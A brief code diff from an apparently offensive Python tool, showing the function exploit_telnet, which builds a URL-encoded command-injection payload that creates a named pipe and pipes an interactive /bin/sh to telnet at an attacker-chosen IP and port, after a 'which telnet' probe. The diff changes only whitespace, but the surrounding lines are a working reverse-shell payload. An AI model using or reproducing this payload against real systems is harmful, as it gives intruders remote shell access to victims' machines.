@@ -10,7 +10,7 @@ def exploit_telnet(exploit, method, ip, port):
 
     url = exploit['GETVAL']
     post = exploit['POSTVAL']
-    
+
     telnetTest = "which%20telnet"
     telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, str(port))
 
